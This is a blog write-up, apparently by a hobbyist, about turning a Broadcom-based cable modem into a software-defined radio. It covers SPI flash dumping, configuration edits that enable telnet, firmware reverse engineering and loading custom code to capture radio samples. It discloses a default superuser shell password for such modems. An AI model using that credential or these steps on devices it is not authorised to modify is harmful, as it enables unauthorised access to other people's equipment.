&lt;p&gt;This output contains a wealth of information. The device is running &lt;a href=&quot;https://en.wikipedia.org/wiki/ECos&quot;&gt;eCos&lt;/a&gt; on a MIPS processor which is part of a Broadcom BCM3383 SoC. It turns out there are actually two MIPS processors on this SoC although one of them is not used on this modem, explaining the other UART. On some devices, the second processor will run Linux for additional features.&lt;/p&gt;
&lt;p&gt;Also, this seems like the end of the line for serial because shortly after booting the actual OS, it disables the serial console. Hitting “p” at the bootloader prompt does not lead to much except a way to download new OS images via tftp and a utility to read and write memory addresses. This could be used to bypass the check, but a much greater understanding of the OS and memory layout would be required.&lt;/p&gt;
&lt;h2 id=&quot;dumping-the-flash&quot;&gt;Dumping the flash&lt;/h2&gt;
&lt;p&gt;My goal now was to enable the serial console. Examination of the board reveals a single &lt;a href=&quot;https://en.wikipedia.org/wiki/Serial_Peripheral_Interface&quot;&gt;SPI&lt;/a&gt; flash chip which likely contains the bootloader, OS, and configuration as it is the only non-volatile storage visible on the board.&lt;/p&gt;
&lt;p&gt;This is where the Raspberry Pi comes in handy once again. The GPIO header also conveniently contains a SPI interface which can be used to read the data off of the flash chip.&lt;/p&gt;
&lt;p&gt;Searching the number on the chip, “winbond 25Q32JV”, yields the datasheet containing the pinout. The important ones are VCC, Chip Select (CS), Clock (CLK), Data Out (DO), Data In (DI), and ground.&lt;/p&gt;
&lt;p&gt;One common issue with dumping a SPI chip on a board is that the chip requires power, but this will also usually power the board and cause it to start booting and using the chip. I chose to overcome this by heating the VCC pin with my soldering iron and very carefully lifting it off the pad. This is a convenient, but rather crude solution which may result in snapped off leads so use at your own risk! I also soldered a jumper wire to the pad and another to the floating leg so that I could easily connect and disconnect them and allow the device to boot again.&lt;/p&gt;
&lt;p&gt;Another note, on some boards the Chip Select pin is assumed to always be enabled so it is directly tied to VCC. This means when you power the CS pin, the board also starts booting. This can be solved in a similar way to the VCC pin.&lt;/p&gt;
&lt;p&gt;Now, wires can be soldered to the rest of the pins and the they can be connected to the Raspberry Pi. The ground goes to ground (the UART ground from earlier can also be used), the VCC to the Pi’s 3.3v pin. (Again, it is critical to verify with the datasheet that this is a 3.3v chip because the Pi only supports 3.3v). The DO pin is connected to the Pi’s SPI &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MISO&lt;/code&gt; (master in slave out) pin and DI to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MOSI&lt;/code&gt; pin (master out slave in). Lastly, the Clock is connected to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SCLK&lt;/code&gt; GPIO pin and the Chip Select to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CE0&lt;/code&gt; pin.&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;img src=&quot;https://stdw.github.io/cm-sdr/img/chip.jpg&quot; alt=&quot;flash chip&quot;/&gt;&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;&lt;em&gt;Not the best soldering job but it will work&lt;/em&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;To actually read the chip, there is a fantastic tool called &lt;a href=&quot;https://flashrom.org/Flashrom&quot;&gt;flashrom&lt;/a&gt; which supports an enormous number of chips. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flashrom&lt;/code&gt; is present in the repos of many distributions including that of the Raspberry Pi OS (formerly known as Raspbian).&lt;/p&gt;
&lt;p&gt;Luckily the W25Q32JV is supported, under the name “W25Q32.V”. A quick check on the flashrom wiki shows the size and voltage match what is expected and that the chip is fully supported.&lt;/p&gt;
&lt;p&gt;Before proceeding, ensure that the SPI interface on the Pi is enabled by using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;raspi-config&lt;/code&gt; utility and checking under “Interfacing Options”.&lt;/p&gt;
&lt;p&gt;At last we can read the chip. First verify that it is detected and everything is wired correctly:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;31.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=2000 \
    --chip W25Q32.V
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;If that succeeds we can now dump the contents:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;31.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=2000 \
    --chip W25Q32.V \
    --read modem.bin
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&quot;firmware-analysis&quot;&gt;Firmware Analysis&lt;/h2&gt;
&lt;p&gt;A quick glance at the hexdump reveals that most of the data is compressed or encrypted but near the end, the configuration is visible.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;32.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;...
003f00c0: ffff ffff ffff ffff ffff 0000 07b0 369a  ..............6.
003f00d0: 6336 0010 434d 4170 0002 0000 0002 0000  c6..CMAp........
003f00e0: 0000 0057 4d4c 6f67 0005 0004 7573 6572  ...WMLog....user
003f00f0: 0004 7573 6572 0005 6164 6d69 6e00 086d  ..user..admin..m
003f0100: 6f74 6f72 6f6c 6102 7465 6368 6e69 6369  otorola.technici
...
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The web interface credentials are plainly visible as well as many other encoded configuration values.&lt;/p&gt;
&lt;p&gt;After some searching, I came across a great project called &lt;a href=&quot;https://github.com/jclehner/bcm2-utils&quot;&gt;bcm2-utils&lt;/a&gt; which contains utilities to dump, parse, and modify the configuration on Broadcom cable modems. The repo also contains a lot of very detailed documentation on the format of the firmware and configuration. As a quick note, the dumping feature requires either telnet or serial connection, neither of which were available on my device.&lt;/p&gt;
&lt;p&gt;The start of the configuration is actually at 0x003f0000 on my device and includes the 202 0xff bytes. After extracting just the config from the dump, I was able to successfully read it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bcm2cfg&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;I enabled the serial console as well as telnet access and set a simpler telnet password.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;32&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;$ ./bcm2-utils/bcm2cfg set bfc.serial_console_mode &quot;rw&quot;
bfc.serial_console_mode = rw
$ ./bcm2-utils/bcm2cfg set userif.remote_acc_methods 0x3
userif.remote_acc_methods = http | telnet
$ ./bcm2-utils/bcm2cfg set userif.remote_acc_pass abcd
userif.remote_acc_pass = abcd
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Next, I appended the modified configuration onto a file padded with zeros up to the appropriate offset and used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flashrom&lt;/code&gt; to write the configuration back to the chip.&lt;/p&gt;
&lt;p&gt;To avoid rewriting the entire chip, I created a layout file for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flashrom&lt;/code&gt; so it would only overwrite the configuration rather than the entire contents which is why the modified image is just padded with zeros. The layout file looks like this:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;31&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;00000000:003effff fw
003f0000:003fffff cfg
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;and the command:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;32&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=2000 \
    --chip W25Q32.V \
    --layout ./layout \
    --image cfg \
    --write modem-modified.bin
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;After opening the serial console and booting again, I am greeted with… the exact same thing as before.&lt;/p&gt;
&lt;p&gt;Closer examination of the flash image shows that there are a number of repeated copies of the configuration following the initial one. These have slight differences, the most obvious being additional error log messages. It appears that the device keeps rolling backups of the configuration in case one gets corrupted.&lt;/p&gt;
&lt;p&gt;To simplify things, I did a factory reset through the web interface to get rid of all the error log messages. Then I dumped the flash again and repeated the previous process to modify the clean configuration except this time I truncated the config to only include the first copy. Then using some &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dd&lt;/code&gt; commands I would rather not think about, I reconstructed the entire configuration section, appending the modified config at each offset where a copy of the config started.&lt;/p&gt;
&lt;p&gt;After flashing this new image and booting once again, I am finally able to view the entire boot log and then have access to a console, although the output is being flooded by a process looking for a signal.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;32.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;...

Reading Permanent settings from non-vol...
Checksum for permanent settings:  0xe9d88f65
Setting downstream calibration signature to '5.7.1mp1|die temperature:70.775degC^@^@^@^@^@'
Settings were read and verified.


Reading Dynamic settings from non-vol...
Checksum for dynamic settings:  0x2630e508
Settings were read and verified.

[00:00:00 01/01/1970] [tStartup] BcmBfcFpmDriver::Init:  (BFC FPM Driver) Setting FPM Buffer size to: 256 Base Address: 0x87566600
[00:00:00 01/01/1970] [tStartup] BcmBfcFpmDriver::Init:  (BFC FPM Driver) fFpmLargestBufferSize: 2048 fFpmSizeShiftBits: 0x8
[00:00:00 01/01/1970] [tStartup] BcmBfcFpmDriver::Init:  (BFC FPM Driver) Pool index: 0  pool size: 2048
[00:00:00 01/01/1970] [tStartup] BcmBfcFpmDriver::Init:  (BFC FPM Driver) Pool index: 1  pool size: 1024
[00:00:00 01/01/1970] [tStartup] BcmBfcFpmDriver::Init:  (BFC FPM Driver) Pool index: 2  pool size: 512
[00:00:00 01/01/1970] [tStartup] BcmBfcFpmDriver::Init:  (BFC FPM Driver) Pool index: 3  pool size: 256
[00:00:00 01/01/1970] [tStartup] BcmBfcFpmDriver::Init:  (BFC FPM Driver) Lookup table index: 0  pool size: 3

...

[00:00:18 01/01/1970] [Scan Downstream Thread] BcmGenericCmDownstreamScanThread::ThreadMain:  (Scan Downstream Thread) Scanning for a Downstream Channel...
[00:00:18 01/01/1970] [Scan Downstream Thread] BcmGenericCmDownstreamScanThread::ScanStarting:  (Scan Downstream Thread) Scanning STD &amp;amp; HRC Annex B channel plan frequencies
Resetting EnergyDetected to false.
Forgetting energy frequency.
Executing fast scan algorithm...

Type 'help' or '?' for a list of commands...

CM&amp;gt; Scanned 489000000 Hz...
Scanned 495000000 Hz...
Scanned 501000000 Hz...
Scanned 507000000 Hz...
Scanned 513000000 Hz...
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&quot;ecos-console&quot;&gt;eCos Console&lt;/h2&gt;
&lt;p&gt;The eCos console contains many configuration and debugging commands. The process flodding the output can be stopped with the following commands:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;cd cm_hal
scan_stop
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;As a side note, these “directories” are not a real filesystem, they are just a way of organizing groups of commands.&lt;/p&gt;
&lt;p&gt;Telnet access also works at the IP address &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.100.1&lt;/code&gt;. The username is “technician” and the password is what I changed it to earlier when modifying the configuration. Telnet puts you into a limited version of the shell, but the full shell can be accessed with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;su&lt;/code&gt; command and the password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brcm&lt;/code&gt; when prompted (credit to jclehner, author of bcm2-utils for that one). This password may vary depending on the device manufacturer.&lt;/p&gt;
&lt;p&gt;Initially, I just wanted to see if I could enable the web-based spectrum analyzer which seems to be disabled on this device. There were some settings related to it, but nothing about enabling or disabling the external interface.&lt;/p&gt;
&lt;p&gt;After spending several hours poking around in the various menus and commands I decided it was time to move on to analyzing OS.&lt;/p&gt;
&lt;h2 id=&quot;reverse-engineering-the-firmware&quot;&gt;Reverse engineering the firmware&lt;/h2&gt;
&lt;p&gt;Thanks to the boot log, we know the OS is located at 0x20000 and is LZMA compressed.&lt;/p&gt;
&lt;p&gt;The README of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bcm2-utils&lt;/code&gt; pointed me to a &lt;a href=&quot;https://github.com/Broadcom/aeolus/tree/master/ProgramStore&quot;&gt;Broadcom repo&lt;/a&gt; containing a utility called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProgramStore&lt;/code&gt; for extracting the OS image.&lt;/p&gt;
&lt;p&gt;After building &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProgramStore&lt;/code&gt; I was able to extract the decompressed image with the following command:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;31&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;./ProgramStore -f ./ecram_sto.bin -o decompressed_fw.bin -c 4 -x
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Now we can throw it into &lt;a href=&quot;https://ghidra-sre.org/&quot;&gt;Ghidra&lt;/a&gt; using the base address from the boot log, 0x80004000 and setting the architecture to big endian MIPS.&lt;/p&gt;
&lt;p&gt;After running the auto analysis it’s time to start digging around. Fortunately, there a lot of debug strings that makes some functions very easy to identify.&lt;/p&gt;
&lt;p&gt;I started naming any functions I came across using the strings as well as the function signature in combination with the context it is used and any cross references. Eventually, when ending up in an unknown function, the cross references to named functions give some clue as to the context of the function eventually making things a little easier.&lt;/p&gt;
&lt;p&gt;For the most part, I was just searching interesting strings such as “tuner” and “ADC” and trying to understand as much as I could, going wherever the various function calls took me and keeping notes on interesting functions, structures, addresses, and theories for how things worked in a separate text document.&lt;/p&gt;
&lt;p&gt;One useful feature of the eCos console is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt; command which allows you to call a function at an arbitrary address with the the given arguments. This allows us to actually execute a function to test a hypothesis about what it does.&lt;/p&gt;
&lt;p&gt;The operating system has a large amount of Broadcom code on top of it which is all written in C++. This makes reversing it significantly more annoying by adding a lot of indirection when it comes to function calls and polymorphism. For example you will often see code like this:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;31&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;case 0x24:
    uVar23 = (**(code **)(*piParm1_00 + 0x1c))(piParm1_00);
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Not only does this make the code very hard to follow, it also means Ghidra cannot track cross references to functions that are called in this way.&lt;/p&gt;
&lt;p&gt;Sometimes the class can be determined by following the object pointer all the way back to where it is initialized, but other times it is easier to just patch a function where the unknown object is used to write the vale of the pointer to a known location and then return. This can be done with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;write_memory&lt;/code&gt; command in the eCos console. Then the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt; command can be used to call the function containing the unknown object and then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read_memory&lt;/code&gt; can be used to retrieve the pointer from the known location. These type of hacks as well as combining static and dynamic analysis are crucial to avoid getting stuck.&lt;/p&gt;
&lt;p&gt;Some functions would cause the device to crash when I tried to call them. Closer inspection shows they are taking more than 4 arguments and using the t0, t1, t2, and t3 registers for the additional arguments. This is a little unusual for a 32-bit MIPS device, but as it turns out the calling convention is determined by the ABI and MIPS has a number of different ABIs. It is suprisingly hard to find information about the exact calling conventions, but using &lt;a href=&quot;https://godbolt.org/&quot;&gt;Godbolt&lt;/a&gt;, I was able to determine that EABI is the most likely candidate which uses t0-t3 for additional arguments. Unfortunately, Ghidra does not seem to support MIPS EABI, but manually setting the argument registers on a few functions is not too inconvenient and the arguments seem to be the only consequential difference.&lt;/p&gt;
&lt;p&gt;After digging around for a while, I set my sights on the spectrum analyzer. I was never able to figure out how to enable the web interface, although the code for it was there.&lt;/p&gt;
&lt;p&gt;I found many other useful functions such as those used to set the frequency of a downstream (recieving) channel, the socket/bind/listen/send/recv functions, thread creation functions, and functions for reading and writing to registers of tuner and LNA (low noise amplifier).&lt;/p&gt;
&lt;h2 id=&quot;breakthrough&quot;&gt;Breakthrough&lt;/h2&gt;
&lt;p&gt;Eventually I found a console command to perform a bandpower measurement for a given frequency range.&lt;/p&gt;
&lt;p&gt;I began closely following the execution to see what it does with the frequency range arguments and found that it calls a very familiar function - almost identical to the one used to tune downstream channels, but the memory mapped register addresses where the frequency is set are just above those used for normal channels. This suggests that the spectrum analyzer uses an extra channel that otherwise operates in a very similar way to the normal downstream channels with regards to tuning and setting the gain.&lt;/p&gt;
&lt;p&gt;Continuing on, the measurement function writes the physical address of a destination buffer to a memory mapped register and then sets a bit in another register and loops until it is unset again. Then it calls the function that presumably computes an FFT, passing in buffer address. After the computation, another function does some processing on the buffer, but leaves it otherwise intact.&lt;/p&gt;
&lt;p&gt;After sticking a jumper wire into the coaxial connector to act as as an antenna, I called the bandpower function and then did a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read_memory&lt;/code&gt; on the destination buffer.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;32.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;CM&amp;gt; read_memory -n256 0x86fb3e80

86fb3e80: 00 00 06 8c  00 3f fe 48  00 00 06 41  00 20 00 3d | .....?.H...A. .=
86fb3e90: 00 00 08 56  00 20 02 11  00 00 0a b3  00 20 03 f2 | ...V. ....... ..
86fb3ea0: 00 00 0a 50  00 20 04 84  00 00 06 61  00 20 03 d7 | ...P. .....a. ..
86fb3eb0: 00 00 01 1d  00 20 02 da  00 1f fd f4  00 20 00 4d | ..... ....... .M
86fb3ec0: 00 1f fd 11  00 3f fc 20  00 1f fb 95  00 3f fa ad | .....?. .....?..
86fb3ed0: 00 1f fa 32  00 3f fd fc  00 1f fc a3  00 20 00 cb | ...2.?....... ..
86fb3ee0: 00 00 01 97  00 3f fe b5  00 00 04 0f  00 3f fb 6a | .....?.......?.j
86fb3ef0: 00 00 03 9f  00 3f fb d6  00 00 03 1d  00 3f fe 55 | .....?.......?.U
86fb3f00: 00 00 02 f8  00 3f ff a9  00 00 02 ee  00 20 01 49 | .....?....... .I
86fb3f10: 00 00 03 8f  00 20 04 87  00 00 03 94  00 20 05 09 | ..... ....... ..
86fb3f20: 00 00 01 81  00 3f ff bb  00 1f ff 14  00 3f fa 97 | .....?.......?..
86fb3f30: 00 1f fe 8d  00 3f fc 9d  00 1f ff 89  00 20 01 82 | .....?....... ..
86fb3f40: 00 00 00 be  00 20 00 09  00 00 01 8f  00 3f fa 3a | ..... .......?.:
86fb3f50: 00 00 01 78  00 3f fa 66  00 00 00 7b  00 20 01 35 | ...x.?.f...{. .5
86fb3f60: 00 1f ff 79  00 20 04 f6  00 1f fe e2  00 20 02 62 | ...y. ....... .b
86fb3f70: 00 1f fd 93  00 3f ff 4d  00 1f fa ee  00 3f fe 16 | .....?.M.....?..
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;My hope was that this was &lt;a href=&quot;http://www.ni.com/tutorial/4805/en/&quot;&gt;I/Q&lt;/a&gt; data and this certainly looked promising. This was supported by the function that processes the data after the FFT - it checks if the 0x00200000 bit is zero on the first 32-bit word, and if so drops the first and last word of data. I hypothesized that this bit indicates if the sample is an I or a Q value, and if the first sample is a Q, it drops the unmatched Q from the beginning and unmatched I from the end. For example:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;31&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;Case 1:                Case 2:
Q IQ IQ IQ I           IQ IQ IQ IQ

     |                      | do nothing
     v                      v

  IQ IQ IQ             IQ IQ IQ IQ
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The only way to know for sure was to grab some more data and analyze it.&lt;/p&gt;
&lt;h2 id=&quot;hello-world&quot;&gt;Hello World&lt;/h2&gt;
&lt;p&gt;To make things easier going forward, I decided to write a program that would run on the modem to call the tune and bandpower functions, and then open a listening sock and send the contents of the buffer back over a TCP connection. I should also note I stopped working on the Raspberry Pi at this point so that I would not have to create an ARM-to-MIPS crosscompiler.&lt;/p&gt;
&lt;p&gt;The basic approach to write code that can be loaded and executed on “almost-bare metal” is as follows.&lt;/p&gt;
&lt;p&gt;By adding the signatures of the external functions we wish to use to a header file and using a linker script containing the addresses of the functions, it is easy to compile a program that utilizes these functions. Additionally, to make the program work when loaded at a predetermined memory location and ensure the entry point is at that address, a section map is be used. The linker script looks something like this:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;32.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;memset = 0x80522d7c;
memcpy = 0x80004f30;
malloc = 0x80596998;
printf = 0x8052b178;
socket = 0x80332fd0;
bind = 0x800ae7bc;
listen = 0x80412ed4;
accept = 0x80413118;
send = 0x80413240;
recv = 0x804134bc;
tune_aux_channel = 0x80082108;

SECTIONS
{
  . = 0x80810000;
  .start : { *(.start) }
  .text : { *(.text) }
  .data : { *(.data) }
  .rodata : { *(.rodata) }
}
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;It is built with with the following command:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;31.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;mips-linux-gcc measure.c \
    -march=mips32 \
    -mabi=eabi \
    -msoft-float \
    -mno-abicalls \
    -fno-builtin 
    -nostdlib \
    -nodefaultlibs \
    -nostartfiles \
    -T ./script.ld
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The MIPS CPU does not have an FPU so &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-msoft-float&lt;/code&gt; is used. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-mno-abicalls&lt;/code&gt; seems to be required when using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-mabi=eabi&lt;/code&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-fno-builtin&lt;/code&gt; prevents the compiler from optimizing certain sections by adding calls to functions like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memcpy&lt;/code&gt; which would result in an undefined symbol. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-nostdlib&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-nostartfiles&lt;/code&gt; prevent the compiler from using the standard c library the “crt0.o” entrypoint which does some setup we do not care about.&lt;/p&gt;
&lt;p&gt;Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objcopy&lt;/code&gt; we can extract just the sections we care about out of the compiled elf.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;31&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;mips-linux-objcopy -O binary \
    -j .start \
    -j .text \
    -j .data \
    -j .rodata \
    a.out bin
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;And finally, to actually load it I wrote a Python script that uses pexpect to telnet into the modem and write the binary to the target address using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;write_memory&lt;/code&gt; command. The program is executed with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt; command.&lt;/p&gt;
&lt;p&gt;To see if I could pick up FM radio broadcasts, I tuned it to 100MHz and grabbed some data.&lt;/p&gt;
&lt;p&gt;Using the numpy, scipy, and matplotlib Python libraries, I was able to interpret the data a complex valued samples, compute an FFT and plot it to see a nice band pass filtered spectrum with distinct spikes.&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;img src=&quot;https://stdw.github.io/cm-sdr/img/plot-full.png&quot; alt=&quot;spectrum plot&quot;/&gt;&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;&lt;em&gt;The plotted frequency spectrum&lt;/em&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;At the time I was still not really convinced, but in retrospect this really does demonstrate that I had successfully captured complex samples as such a plot would not be possible with the my script were that not the case.&lt;/p&gt;
&lt;p&gt;I was not going to be fully convinced until I could demodulate the signal and listen to the FM radio broadcasts. Shifting the spectrum to center one of the spikes, decimating it to isolate the frequency range, and using a very simple demodulation technique I found online for complex-valued FM, I was able to clearly see the different parts of the broadcast including the (what should be) 19kHz pilot tone.&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;img src=&quot;https://stdw.github.io/cm-sdr/img/plot-demodulated.png&quot; alt=&quot;spectrum plot&quot;/&gt;&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;&lt;em&gt;The frequency spectrum of the demodulated signal&lt;/em&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;With some experimentation, I determined that a sample rate of 15 million samples per second puts the pilot tone right at 19kHz. This seems consistent with the fact that the bandpower function measures in blocks of 7.5MHz. Although you get a full 15MHz since these are complex-valued samples, the usable range of the band pass filter is more like 7.5-8MHz with an assumed 15MHz sample rate which matches up.&lt;/p&gt;
&lt;h2 id=&quot;optimizations&quot;&gt;Optimizations&lt;/h2&gt;
&lt;p&gt;At 15 million samples per second and each sample with occupying 8 bytes, less than a second of data can be stored in the approximately 100MB of free RAM.&lt;/p&gt;
&lt;p&gt;One obvious improvement would be to send the data after filling the buffer and then capture more data. The processing time and network throughput meant that there was about an 11 second gap between captures. This was cut down to about 5 seconds by implementing a new function that sets up the registers and initiates the capture, eliminating the FFT calculation and other processing.&lt;/p&gt;
&lt;p&gt;After some experimentation with the unknown register values in hopes of finding one that would affect the sample rate, I found a bit that appears to limit the I and Q values to 14 significant bits. While they were still occupying 8 bytes per sample, this meant I could pack two of them into a single 32-bit word.&lt;br/&gt;Note: I am not sure the ADC is actually sampling 14 / 20 bits as that seems rather high, but that is the effective size of each sample value.&lt;/p&gt;
&lt;p&gt;I wrote another function to process each capture, determine if it starts with an I or a Q value and then iterate through the buffer packing each I/Q pair into a single integer and writing it to the next position in the buffer. This alone did not improve the performance much, but by only taking every Nth sample, I could lower the effective sample rate, shorten the processing time, and reduce the number of bytes I had to send back which greatly improved the latency.&lt;/p&gt;
&lt;p&gt;Another improvement was threading. I found the functions used to create and start new threads as well as those used for counting semaphores on the OS thanks to some debug messages. With these tools, I could have two or more buffers. Then one thread continuously captures data into the next available buffer and then signals another thread with a semaphore that it is done writing. The second thread packs and downsamples the data, sends it over the network, and then signals that the buffer is available to be written to again.&lt;/p&gt;
&lt;p&gt;With these improvements and the sample rate reduced by a factor of 32 (down to 464kHz), I could endlessly capture and send data while dropping about 12%. I believe this is mostly due to a few milliseconds of inherent latency between when the capture is finished and the “done” flag is set. Additionally, I do not know if there is a way to generate an interrupt or something when it finishes so I have to restort to sleeping in a while loop since that is how it is done in the original function.&lt;/p&gt;
&lt;p&gt;My hope is that there is some sort of clock divider register to reduce the clock of the ADC to lower the sample rate which may reduce this latancy and eliminate postprocessing time, but I have not yet found one.&lt;/p&gt;
&lt;p&gt;Downsampling this way seems to lose a lot of the information - past about 16 times the noise floor is a lot higher and the stereo channels of FM radio broadcasts are no longer discernable.&lt;/p&gt;
